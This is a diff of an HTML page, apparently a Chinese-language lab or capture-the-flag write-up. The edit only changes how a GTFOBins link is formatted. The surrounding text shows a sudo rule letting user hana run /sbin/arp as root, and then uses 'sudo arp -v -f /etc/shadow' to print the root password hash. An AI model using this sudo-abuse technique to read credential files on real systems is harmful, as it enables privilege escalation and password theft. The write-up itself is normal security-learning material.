@@ -339,7 +339,7 @@ Matching Defaults entries for hana on devoops:
 User hana may run the following commands on devoops:
     (root) NOPASSWD: /sbin/arp
 </code></pre>
-<p>结果显示 <code>hana</code> 用户可以无密码以root权限执行 <code>/sbin/arp</code> 命令。这是一个已知的可被利用于提权的配置。查询 [<a href="https://gtfobins.github.io/gtfobins/arp/#sudo">GTFOBins</a>](<a href="https://gtfobins.github.io/gtfobins/arp/#sudo">https://gtfobins.github.io/gtfobins/arp/#sudo</a>) 可知，<code>arp</code> 命令的 <code>-f</code> 参数可以加载一个文件，如果指定的文件不存在或格式错误，它会尝试逐行读取并显示文件内容，从而实现任意文件读取。</p>
+<p>结果显示 <code>hana</code> 用户可以无密码以root权限执行 <code>/sbin/arp</code> 命令。这是一个已知的可被利用于提权的配置。查询 [<a href="https://gtfobins.github.io/gtfobins/arp/#sudo">GTFOBins</a>](https://gtfobins.github.io/gtfobins/arp/#sudo) 可知，<code>arp</code> 命令的 <code>-f</code> 参数可以加载一个文件，如果指定的文件不存在或格式错误，它会尝试逐行读取并显示文件内容，从而实现任意文件读取。</p>
 <p>利用此特性读取 <code>/etc/shadow</code> 文件，获取root用户的密码哈希。</p>
 <pre lang="shell"><code>devoops:~$ sudo arp -v -f /etc/shadow
 &gt;&gt; root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
